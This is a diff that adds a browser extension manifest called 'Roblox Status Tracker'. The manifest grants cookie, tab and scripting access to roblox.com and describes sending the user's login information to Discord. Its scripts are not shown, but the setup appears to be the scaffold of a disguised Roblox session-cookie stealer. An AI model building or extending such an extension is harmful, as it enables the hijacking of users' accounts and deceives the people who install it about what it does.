@@ -1,0 +1,21 @@
+{
+  "manifest_version": 3,
+  "name": "Roblox Status Tracker",
+  "version": "1.0",
+  "description": "Detects Roblox login status and sends info to Discord",
+  "permissions": ["cookies", "tabs", "scripting", "activeTab"],
+  "host_permissions": ["https://www.roblox.com/*"],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": ["https://www.roblox.com/*"],
+      "js": ["content.js"],
+      "run_at": "document_idle"
+    }
+  ],
+  "action": {
+    "default_title": "Roblox Status Tracker"
+  }
+}
